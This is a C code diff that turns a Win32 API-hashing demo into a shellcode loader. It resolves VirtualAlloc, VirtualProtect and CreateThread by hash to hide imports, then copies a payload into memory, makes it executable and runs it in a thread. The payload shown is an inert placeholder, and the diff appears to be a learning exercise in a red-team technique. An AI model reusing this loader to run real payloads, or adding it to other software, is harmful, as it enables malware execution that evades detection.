@@ -58,19 +58,87 @@ PWORD getFooAddressesByHash(char* lib, DWORD hash) {
     return NULL;
 }
 
-typedef int (WINAPI* msgbox)(HWND,LPCSTR,LPCSTR,UINT);
+// typedef int (WINAPI* msgbox)(HWND,LPCSTR,LPCSTR,UINT);
+
+typedef HANDLE (WINAPI*pCreateThread)(
+    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+    SIZE_T                  dwStackSize,
+    LPTHREAD_START_ROUTINE  lpStartAddress,
+    __drv_aliasesMem LPVOID lpParameter,
+    DWORD                   dwCreationFlags,
+    LPDWORD                 lpThreadId
+);
+
+typedef BOOL (WINAPI*pVirtualProtect)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flNewProtect,
+    PDWORD lpflOldProtect
+);
+
+typedef LPVOID (WINAPI* pVirtualAlloc)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+
 
 int main(int argc, char* argv[]) {
-    printf("MessageBoxA hash: 0x%x\n", getFuncHash("MessageBoxA"));
-    
-    PWORD functionAddr = getFooAddressesByHash((char*)"user32", 0x5e07617);
-    if (functionAddr == NULL) {
+
+    printf("CreateThread hash: 0x%x\n", getFuncHash("CreateThread"));
+    printf("VirtualProtect hash: 0x%x\n", getFuncHash("VirtualProtect"));
+    printf("VirtualAlloc hash: 0x%x\n", getFuncHash("VirtualAlloc"));
+
+    // Payload to execute
+    unsigned char payload [] = {
+        0x90, 0x90, 0xcc, 0xc3
+    };
+
+    pVirtualAlloc virtualAlloc = (pVirtualAlloc)getFooAddressesByHash("kernel32", 0x59a6224);
+    pVirtualProtect virtualProtect = (pVirtualProtect)getFooAddressesByHash("kernel32", 0x721e916);
+    pCreateThread createTHread = (pCreateThread)getFooAddressesByHash("kernel32", 0x4c162bc);
+
+    void* payloadMem = virtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    printf("Payload VA: %p\n", payloadMem);
+
+    RtlMoveMemory(payloadMem, payload, sizeof(payload));
+
+    DWORD oldProtect = NULL;
+    if (!virtualProtect(payloadMem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
+        printf("Failed to load payload!\n");
         return 1;
     }
 
-    msgbox foo = (msgbox)functionAddr;
+    printf("Shellcode loaded, hit to proceed...\n");
+    getchar();
+
+    HANDLE thread = createTHread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloadMem, NULL, NULL, NULL);
+    if (thread == NULL) {
+        printf("Failed to execute payload!\n");
+        return 1;
+    }
+
+    WaitForSingleObject(thread, INFINITE);
     
-    foo(NULL, "Win32 API hasher", "Executing MessageBoxA via hashed function!", MB_ICONASTERISK | MB_OK);
+    // PWORD functionAddr = getFooAddressesByHash((char*)"user32", 0x5e07617);
+    // if (functionAddr == NULL) {
+    //     return 1;
+    // }
+
+    // msgbox foo = (msgbox)functionAddr;
+    
+    // foo(NULL, "Win32 API hasher", "Executing MessageBoxA via hashed function!", MB_ICONASTERISK | MB_OK);
+
+    // PWORD functionAddr2 = getFooAddressesByHash((char*)"kernel32", 0x721e916);
+
+    // vprotect foo2 = (vprotect)functionAddr2;
+
+    // PDWORD oldProtect = 0;
+    // foo2(NULL, 4, PAGE_EXECUTE_READWRITE, oldProtect);
+
+
+    
     return 0;
 }
 
